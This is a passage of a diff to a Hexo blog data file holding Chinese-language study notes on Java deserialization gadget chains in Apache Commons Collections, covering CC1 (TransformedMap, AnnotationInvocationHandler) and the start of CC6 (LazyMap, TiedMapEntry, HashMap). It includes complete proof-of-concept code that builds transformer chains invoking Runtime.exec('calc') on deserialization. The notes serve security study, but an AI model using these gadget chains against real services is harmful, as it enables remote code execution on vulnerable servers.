(Map.Entry) it.next();              result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));          &#125;          return result;      &#125;        /**       * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.       ** @param value  the value to transform       * @return the transformed value       * @since Commons Collections 3.1       */    protected Object checkSetValue(Object value) &#123;          return valueTransformer.transform(value);      &#125;        /**       * Override to only return true when there is a value transformer.     ** @return true if a value transformer is in use       * @since Commons Collections 3.1       */    protected boolean isSetValueChecking() &#123;          return (valueTransformer != null);      &#125;        //-----------------------------------------------------------------------      public Object put(Object key, Object value) &#123;          key = transformKey(key);          value = transformValue(value);          return getMap().put(key, value);      &#125;        public void putAll(Map mapToCopy) &#123;          mapToCopy = transformMap(mapToCopy);          getMap().putAll(mapToCopy);      &#125;    &#125;
+
+我们稍微理解一下这段代码，这个类继承自AbstractInputCheckedMapDecorator，是可以被序列化的，这个类接收两个参数这两个参数都是Transformer我们发现这个类的构造方法是protected的，但是提供了一个静态方法用来实例化对象我们发现这个类里面的checkSetValue方法调用了Transformer这个方法，我们只要让这个value是Runtime就可以了，我们写个简单的exp试一试。
+public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          Map decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);          Class&lt;? extends Map&gt; aClass = decorate.getClass();          Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);          checkSetValue.setAccessible(true);          checkSetValue.invoke(decorate,runtime);              &#125;  &#125;
+这段代码我绕了好久才明白，我们的目的是使用这个transformer，并且使用这个transformer的是一个invoke的transformer，这样的话才能自然而然的调用他那个类里重写的方法，我们找到的这段函数是valuetransformer去调用，那么我们就要让valuetransformer是invoketransformer，所以我们把这个对象的第三个参数设置成这个，value的参数自然是Runtime，这样就可以实现我们的命令了。这一步我们总结出来的道理就是我们要找到谁使用了这个transformer方法，我们要保证使用这个方法的可以是invoketransformer，好像有点像废话，肯定只有transformer的参数才能用这个方法啊。我们接着往下找吧。
+我们只能创建对象或者集合，所以我们就要找谁使用了这个decorate这个方法，遗憾的是这条路是走不通的，这种情况意味着我们不能实例化这个对象了，因为decorate我们不能使用，所以我们就只能找还有哪个类调用了checkvalue这个方法。
+AbstractInputCheckedMapDecorator 与 setValue我们发现只有一个调用了这个方法，就是AbstractInputCheckedMapDecorator类
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.lang.reflect.Array;  import java.util.Iterator;  import java.util.Map;  import java.util.Set;    import org.apache.commons.collections.iterators.AbstractIteratorDecorator;  import org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;  import org.apache.commons.collections.set.AbstractSetDecorator;    /**   * An abstract base class that simplifies the task of creating map decorators. * &lt;p&gt;   * The Map API is very difficult to decorate correctly, and involves implementing   * lots of different classes. This class exists to provide a simpler API. * &lt;p&gt;   * Special hook methods are provided that are called when objects are added to   * the map. By overriding these methods, the input can be validated or manipulated. * In addition to the main map methods, the entrySet is also affected, which is * the hardest part of writing map implementations. * &lt;p&gt;   * This class is package-scoped, and may be withdrawn or replaced in future   * versions of Commons Collections. * * @since Commons Collections 3.1   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */abstract class AbstractInputCheckedMapDecorator          extends AbstractMapDecorator &#123;        /**       * Constructor only used in deserialization, do not use otherwise.     */    protected AbstractInputCheckedMapDecorator() &#123;          super();      &#125;        /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @throws IllegalArgumentException if map is null       */    protected AbstractInputCheckedMapDecorator(Map map) &#123;          super(map);      &#125;        //-----------------------------------------------------------------------      /**       * Hook method called when a value is being set using &lt;code&gt;setValue&lt;/code&gt;.       * &lt;p&gt;       * An implementation may validate the value and throw an exception       * or it may transform the value into another object.     * &lt;p&gt;       * This implementation returns the input value.       ** @param value  the value to check       * @throws UnsupportedOperationException if the map may not be changed by setValue       * @throws IllegalArgumentException if the specified value is invalid       * @throws ClassCastException if the class of the specified value is invalid       * @throws NullPointerException if the specified value is null and nulls are invalid       */    protected abstract Object checkSetValue(Object value);        /**       * Hook method called to determine if &lt;code&gt;checkSetValue&lt;/code&gt; has any effect.       * &lt;p&gt;       * An implementation should return false if the &lt;code&gt;checkSetValue&lt;/code&gt; method       * has no effect as this optimises the implementation.     * &lt;p&gt;       * This implementation returns &lt;code&gt;true&lt;/code&gt;.       ** @return true always       */    protected boolean isSetValueChecking() &#123;          return true;      &#125;        //-----------------------------------------------------------------------      public Set entrySet() &#123;          if (isSetValueChecking()) &#123;              return new EntrySet(map.entrySet(), this);          &#125; else &#123;              return map.entrySet();          &#125;      &#125;        //-----------------------------------------------------------------------      /**       * Implementation of an entry set that checks additions via setValue.     */    static class EntrySet extends AbstractSetDecorator &#123;                    /** The parent map */          private final AbstractInputCheckedMapDecorator parent;            protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) &#123;              super(set);              this.parent = parent;          &#125;            public Iterator iterator() &#123;              return new EntrySetIterator(collection.iterator(), parent);          &#125;                    public Object[] toArray() &#123;              Object[] array = collection.toArray();              for (int i = 0; i &lt; array.length; i++) &#123;                  array[i] = new MapEntry((Map.Entry) array[i], parent);              &#125;              return array;          &#125;                    public Object[] toArray(Object array[]) &#123;              Object[] result = array;              if (array.length &gt; 0) &#123;                  // we must create a new array to handle multi-threaded situations                  // where another thread could access data before we decorate it                result = (Object[]) Array.newInstance(array.getClass().getComponentType(), 0);              &#125;              result = collection.toArray(result);              for (int i = 0; i &lt; result.length; i++) &#123;                  result[i] = new MapEntry((Map.Entry) result[i], parent);              &#125;                // check to see if result should be returned straight              if (result.length &gt; array.length) &#123;                  return result;              &#125;                // copy back into input array to fulfil the method contract              System.arraycopy(result, 0, array, 0, result.length);              if (array.length &gt; result.length) &#123;                  array[result.length] = null;              &#125;              return array;          &#125;      &#125;        /**       * Implementation of an entry set iterator that checks additions via setValue.     */    static class EntrySetIterator extends AbstractIteratorDecorator &#123;                    /** The parent map */          private final AbstractInputCheckedMapDecorator parent;                    protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123;              super(iterator);              this.parent = parent;          &#125;                    public Object next() &#123;              Map.Entry entry = (Map.Entry) iterator.next();              return new MapEntry(entry, parent);          &#125;      &#125;        /**       * Implementation of a map entry that checks additions via setValue.     */    static class MapEntry extends AbstractMapEntryDecorator &#123;            /** The parent map */          private final AbstractInputCheckedMapDecorator parent;            protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;              super(entry);              this.parent = parent;          &#125;            public Object setValue(Object value) &#123;              value = parent.checkSetValue(value);              return entry.setValue(value);          &#125;      &#125;    &#125;
+这段代码很长，我们看到这是一个抽象类是不能实例化的，同时还没有public是不能直接访问的。很显然是他的子类在调用setvalue的时候会调用checksetvalue这个方法，所以接下来我们验证一下执行这个setvalue会不会触发调用。
+protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;      super(entry);      this.parent = parent;  &#125;    public Object setValue(Object value) &#123;      value = parent.checkSetValue(value);      return entry.setValue(value);  &#125;
+我们不难发现，这里需要的对象是Map.Entry，我们新建的map是不能直接调用这个方法的，所以我们需要先进行一个遍历取出这个entry之后再能进行调用
+public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          objectObjectHashMap.put(&quot;name&quot;,&quot;hello&quot;);          Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  //        Class&lt;? extends Map&gt; aClass = decorate.getClass();  //        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  //        checkSetValue.setAccessible(true);  //        checkSetValue.invoke(decorate,runtime);          for (Map.Entry entry : decorate.entrySet())&#123;              entry.setValue(runtime);            &#125;      &#125;  &#125;
+
+进入 AnnotationInvocationHandler我们发现成功弹计算器，证明是可以正常调用的，接下来我们的目标就是谁调用了这个setvalue我们发现AnnotationInvocationHandler这个类的readobject调用了这个，那我们只要实例化这个类的对象然后再进行反序列化就完成目标了，终于要走到尽头了吗。接下来我们先把完整的exp写出来然后再进行修正。 AnnotationInvocationHandler这个类的代码非常长我就不贴出来了这个类继承自InvocationHandler，可以被序列化，有两个参数一个是type也就是注解，另一个就是map。
+这个类是deafult的，也只能通过反射进行获取我们先本写exp吧
+public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          objectObjectHashMap.put(&quot;name&quot;,&quot;hello&quot;);          Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  //        Class&lt;? extends Map&gt; aClass = decorate.getClass();  //        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  //        checkSetValue.setAccessible(true);  //        checkSetValue.invoke(decorate,runtime);          Class&lt;?&gt; bClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = bClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          Object o = declaredConstructor.newInstance(Override.class, objectObjectHashMap);        &#125;  &#125;
+
+通过反射组织调用链接下来我们要解决一个问题，Runtime是不能序列化的。我们可以先使用反射的方式实现命令执行
+Class&lt;Runtime&gt; runtimeClass = Runtime.class;  Method getRuntime = runtimeClass.getMethod(&quot;getRuntime&quot;);  Object invoke = getRuntime.invoke(null, null);  Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);  exec.invoke(invoke,&quot;calc&quot;);
+然后我们改成使用invoketransformer来实现
+Object o1 = new InvokerTransformer(          &quot;getMethod&quot;,          new Class[]&#123;String.class, Class[].class&#125;,          new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;  ).transform(Runtime.class);//(Runtime.class).getMethod(&quot;getRuntime&quot;) --&gt; method    Object invoke1 = new InvokerTransformer(          &quot;invoke&quot;,          new Class[]&#123;Object.class, Object[].class&#125;,          new Object[]&#123;null, new Object[0]&#125;  ).transform(o1);//o1.invoke(null,null)  --&gt; 相当于创建一个runtime实例  Object getMethod = new InvokerTransformer(          &quot;getMethod&quot;,          new Class[]&#123;String.class, Class[].class&#125;,          new Object[]&#123;&quot;exec&quot;, String.class&#125;  ).transform(invoke1);//invoke1.getmethod(&quot;exec&quot;,String.class) --&gt;获取到exec这个方法  new InvokerTransformer(          &quot;invoke&quot;,          new Class[]&#123;Object.class, Object[].class&#125;,          new Object[]&#123;invoke1, &quot;calc&quot;&#125;  ).transform(getMethod);//exec.invoke(invoke1,&quot;calc&quot;)
+这里逻辑还是挺绕的我们要理解o.transformer(input)–&gt;input.methodname(newobject[])
+换成用chaintransformer表述
+Transformer[] transformers = new Transformer[]&#123;                // 起点：无视输入，固定返回 Runtime.class                new ConstantTransformer(Runtime.class),                // 第1步：Runtime.class.getMethod(&quot;getRuntime&quot;) → Method                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;                ),                // 第2步：Method.invoke(null) → Runtime 实例                new InvokerTransformer(                        &quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;                ),                // 第3步：Runtime 实例.exec(&quot;calc&quot;) → 直接执行，不再找 exec                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;                )        &#125;;        Transformer chain = new ChainedTransformer(transformers);        // 触发：输入任意值（会被 ConstantTransformer 丢弃）        chain.transform(&quot;随便什么&quot;);
+
+构造完整实验代码最终得到一个完整的exp
+  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.map.TransformedMap;    import java.io.*;  import java.lang.reflect.Constructor;  import java.util.HashMap;  import java.util.Map;    // 解决了第一个问题  public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Transformer[] transformers = new Transformer[]&#123;                  new InvokerTransformer(&quot;getMethod&quot;                          , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;                          , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;                          , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();          hashMap.put(&quot;key&quot;,&quot;value&quot;);          Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);          Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);          aihConstructor.setAccessible(true);          Object o = aihConstructor.newInstance(Override.class, transformedMap);            // 序列化反序列化          serialize(o);          unserialize(&quot;ser.bin&quot;);      &#125;      public static void serialize(Object obj) throws IOException &#123;          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));          oos.writeObject(obj);      &#125;      public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));          Object obj = ois.readObject();          return obj;      &#125;  &#125;
+
+断点调试与条件修正紧接着我们下断点进行调试
+for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;      String name = memberValue.getKey();      Class&lt;?&gt; memberType = memberTypes.get(name);      if (memberType != null) &#123;  // i.e. member still exists          Object value = memberValue.getValue();          if (!(memberType.isInstance(value) ||                value instanceof ExceptionProxy)) &#123;              memberValue.setValue(                  new AnnotationTypeMismatchExceptionProxy(                      value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(                          annotationType.members().get(name)));
+我们发现我们还有两个问题需要解决，一是value的值我们希望是chain，而是我们还需要构造通过if判断，一个一个解决这两个问题这里的两个if是第一个注解成员是不是空的，我们用的确实是空的所以直接不通过，所以我们要换一个注解成员不为空的，同时还要通过第二个if，第二个if比较好通过，保证value的类型和它不一致同时不是哪个错误里的就行我们选择了target这个注释就可以通过判断进入setvalue这个我们梦寐以求的代码里了。但是非常不幸的是我们进入之后发现这个value的参数我们没办法控制，这个value是固定的。这时候好像走入死胡同了，接下来将出现神之一手，之前那几个transformer的几个实现类里面有一个是无论什么输入都会转换成固定值，那我们在chain里第一个放上一个，那我们不管它的value是什么到我们这里都可以成为我们想要的值，真实冥冥之中都是写好的，能发现这个漏洞的也是真厉害。
+  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.map.TransformedMap;    import java.io.*;  import java.lang.annotation.Target;  import java.lang.reflect.Constructor;  import java.util.HashMap;  import java.util.Map;    // 解决了第一个问题  public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;                          , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;                          , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;                          , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();          hashMap.put(&quot;value&quot;,&quot;cc&quot;);          Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);          Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);          aihConstructor.setAccessible(true);          Object o = aihConstructor.newInstance(Target.class, transformedMap);            // 序列化反序列化          serialize(o);          unserialize(&quot;ser.bin&quot;);      &#125;      public static void serialize(Object obj) throws IOException &#123;          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));          oos.writeObject(obj);      &#125;      public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));          Object obj = ois.readObject();          return obj;      &#125;  &#125;
+伟大无需多言。
+调用链回顾接下来我们再梳理一遍这个思路，我们首先发现invoketransformer里面可以任意在执行命令，我们接着找谁可以调用这个transformer方法，我们发现了transformermap里面的checkvalueset，然后 接着往上找我们找到了setvalue，然后这个还被readobject调用，这样我们的反序列化链条就完善了。
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>CC1</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2025/07/16/hello-world/</url>
     <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
@@ -31,9 +810,152 @@ More info: Deployment
 ]]></content>
   </entry>
   <entry>
+    <title>cc6链学习</title>
+    <url>//2026/11/01/cc6-study/</url>
+    <content><![CDATA[重新开始 CC6 学习今天正式开始cc6链的学习，前两天面试耽误了几天没学习今天重新开始首先这个链条可以不受jdk版本的限制了，不过我们还是沿用之前的环境不做修改首先链尾执行命令的地方还是一样的，还是invoketransformer的transformer，区分在lazymap里get方法的调用来源不同，这里findusage会出现很多调用，这里目前我不知道当年技术人员是怎么找到的，暂时我也没看到技术文章的方法，先暂时留空由以后去解决。
+TiedMapEntry 与 getValueget方法是追踪到了tiedmapentry里面
+/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.keyvalue;    import java.io.Serializable;  import java.util.Map;    import org.apache.commons.collections.KeyValue;    /**   * A &#123;@link java.util.Map.Entry Map.Entry&#125; tied to a map underneath.   * &lt;p&gt;   * This can be used to enable a map entry to make changes on the underlying   * map, however this will probably mess up any iterators. * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = -8453869361373831205L;        /** The map underlying the entry/iterator */      private final Map map;      /** The key */      private final Object key;        /**       * Constructs a new entry with the given Map and key.     *     * @param map  the map       * @param key  the key       */    public TiedMapEntry(Map map, Object key) &#123;          super();          this.map = map;          this.key = key;      &#125;        // Map.Entry interface      //-------------------------------------------------------------------------    /**       * Gets the key of this entry     ** @return the key       */    public Object getKey() &#123;          return key;      &#125;        /**       * Gets the value of this entry direct from the map.     ** @return the value       */    public Object getValue() &#123;          return map.get(key);      &#125;        /**       * Sets the value associated with the key direct onto the map.     ** @param value  the new value       * @return the old value       * @throws IllegalArgumentException if the value is set to this map entry       */    public Object setValue(Object value) &#123;          if (value == this) &#123;              throw new IllegalArgumentException(&quot;Cannot set value to this map entry&quot;);          &#125;          return map.put(key, value);      &#125;        /**       * Compares this &lt;code&gt;Map.Entry&lt;/code&gt; with another &lt;code&gt;Map.Entry&lt;/code&gt;.       * &lt;p&gt;       * Implemented per API documentation of &#123;@link java.util.Map.Entry#equals(Object)&#125;       ** @param obj  the object to compare to       * @return true if equal key and value       */    public boolean equals(Object obj) &#123;          if (obj == this) &#123;              return true;          &#125;          if (obj instanceof Map.Entry == false) &#123;              return false;          &#125;          Map.Entry other = (Map.Entry) obj;          Object value = getValue();          return              (key == null ? other.getKey() == null : key.equals(other.getKey())) &amp;&amp;              (value == null ? other.getValue() == null : value.equals(other.getValue()));      &#125;        /**       * Gets a hashCode compatible with the equals method.     * &lt;p&gt;       * Implemented per API documentation of &#123;@link java.util.Map.Entry#hashCode()&#125;       ** @return a suitable hash code       */    public int hashCode() &#123;          Object value = getValue();          return (getKey() == null ? 0 : getKey().hashCode()) ^                 (value == null ? 0 : value.hashCode());       &#125;        /**       * Gets a string version of the entry.     ** @return entry as a string       */    public String toString() &#123;          return getKey() + &quot;=&quot; + getValue();      &#125;    &#125;
+这个代码不长我们可以简单分析一下，现在我很喜欢看java代码这个过程这里定义了一个键值对的对象，里面的构造方法是公共的可以直接进行构造，终于不要用反射了，还定义了键值对的相关方法，比如判断键值对是否相等，获取value，设置vlaue等功能。我们发现这里的getvalue会调用get方法，我们先写一个简单的exp尝试一下
+import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.crypto.dsig.Transform;  import java.util.HashMap;  import java.util.Map;    public class cc2 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();  //        Runtime runtime = Runtime.getRuntime();  //        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Transformer[] transformers = &#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);              Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);          tiedMapEntry.getValue();          &#125;  &#125;
+我写完这个链条之后一开始有点不理解，我们这个entry的key是一个字符串，调用getvalue方法之后调用lazymap的get方法，然后在get方法中又调用了transform方法，那这样不是字符串作为input吗，那他应该是获取到string类型的Class啊。后来发现我对其中的对象没有搞清楚，lazymap盗用transform方法的时候这个对象是chaintransformer，没有直接进入invoketransformer当中，所以首先先把输入变成Runtime.class，这个问题前面我们已经解释过了，到这里又想不通了，接下来我们继续，看谁调用了getvalue
+public int hashCode() &#123;      Object value = getValue();      return (getKey() == null ? 0 : getKey().hashCode()) ^             (value == null ? 0 : value.hashCode());   &#125;
+
+hashCode 与 HashMap 入口刚才在看代码的时候特地留了一段没讲，就是hashcode这个方法，这是我们接下来的关键，刚才找getvalue的调用发现有非常多的调用，不知道当年的大佬是怎么发现的换成我估计就放弃了，看博客说在这里优先看同类中是否有调用的，果然在hashcode中调用了这个方法。我们简单介绍一下这段代码，首先获得key对应的value，然后对key和value分别进行hashcode的计算如果为空就设为0，然后再对二者做异或运算。看博主说到了这一步如果在实战中遇到了hashcode基本上可以开香槟了，接下来还有比较完善的链条思路，首先hashmap中的hash方法使用了hashcode，put调用了hash，代码放在下面了
+static final int hash(Object key) &#123;      int h;      return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);  &#125;
+public V put(K key, V value) &#123;      return putVal(hash(key), key, value, false, true);  &#125;
+同样在hashmap中的readobject中会进行hash的运算，这也是一个很好的入口类，
+private void readObject(java.io.ObjectInputStream s)      throws IOException, ClassNotFoundException &#123;      // Read in the threshold (ignored), loadfactor, and any hidden stuff      s.defaultReadObject();      reinitialize();      if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))          throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                           loadFactor);      s.readInt();                // Read and ignore number of buckets      int mappings = s.readInt(); // Read number of mappings (size)      if (mappings &lt; 0)          throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                           mappings);      else if (mappings &gt; 0) &#123; // (if zero, use defaults)          // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);          float fc = (float)mappings / lf + 1.0f;          int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                     DEFAULT_INITIAL_CAPACITY :                     (fc &gt;= MAXIMUM_CAPACITY) ?                     MAXIMUM_CAPACITY :                     tableSizeFor((int)fc));          float ft = (float)cap * lf;          threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                       (int)ft : Integer.MAX_VALUE);          @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)              Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];          table = tab;            // Read the keys and values, and put the mappings in the HashMap          for (int i = 0; i &lt; mappings; i++) &#123;              @SuppressWarnings(&quot;unchecked&quot;)                  K key = (K) s.readObject();              @SuppressWarnings(&quot;unchecked&quot;)                  V value = (V) s.readObject();              ==🔵putVal(hash(key), key, value, false, false);==          &#125;      &#125;  &#125;
+
+
+串起反序列化实验import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.crypto.dsig.Transform;  import java.util.HashMap;  import java.util.Map;    public class cc2 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();  //        Runtime runtime = Runtime.getRuntime();  //        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Transformer[] transformers = &#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);              Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);  //        tiedMapEntry.getValue();          HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();          cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);          &#125;  &#125;
+可以弹计算机
